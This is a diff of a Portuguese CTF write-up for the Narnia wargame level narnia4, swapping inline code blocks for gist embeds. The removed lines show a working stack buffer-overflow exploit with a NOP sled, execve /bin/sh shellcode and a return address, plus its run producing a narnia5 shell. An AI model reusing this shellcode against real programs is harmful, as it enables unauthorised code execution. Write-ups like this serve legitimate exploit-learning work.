@@ -51,16 +51,10 @@ A partir desse momento segui os mesmos passos do <a href="https://brenn0.wordpre
 
 Acabei ficando com o exploit assim:
 
-```
-python -c 'print \x90*224 + \x31\xc0\xb0\x46\x31\xc9\x31\xdb\xcd\x80\xeb\x18\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x31\xc0\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68 + \xad\xd7\xff\xff'
-```
+<script src="https://gist.github.com/nick-belane/3db7c8b59fdf406e2cecfd9649f83a23.js"></script>
 
 Que quando executado:
 
-```
-narnia4@melinda:/narnia$ ./narnia4 `python -c 'print \x90*224 + \x31\xc0\xb0\x46\x31\xc9\x31\xdb\xcd\x80\xeb\x18\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x31\xc0\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68 + \xad\xd7\xff\xff'`
-$ whoami
-narnia5
-```
+<script src="https://gist.github.com/nick-belane/96c1e73b30ef26c4941400591d60cce2.js"></script>
 
 Mas antes de finalizar, queria salientar que uma coisa nova que aprendi resolvendo esse desafio foi de que algumas vezes o exploit pode rodar dentro do gdb e resultar em um erro fora dele (illegal instruction ou coisa assim). Isso acontece porque o gdb joga umas variaveis de ambiente extras no stack, o que pode bagunçar com os endereços. Ou seja, no gdb vai ser um endereço e fora dele será outro. No passado fiquei confuso quando me deparei com esse tipo de comportamento mas nunca pesquisei a fundo, mas, ao resolver esse chall e ao mesmo tempo tentar entender o máximo possível do que acontecia, encontrei esta bela postagem chamada "<a href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html">Common Pitfalls When Writing Exploits</a>". Recomendo a leitura.
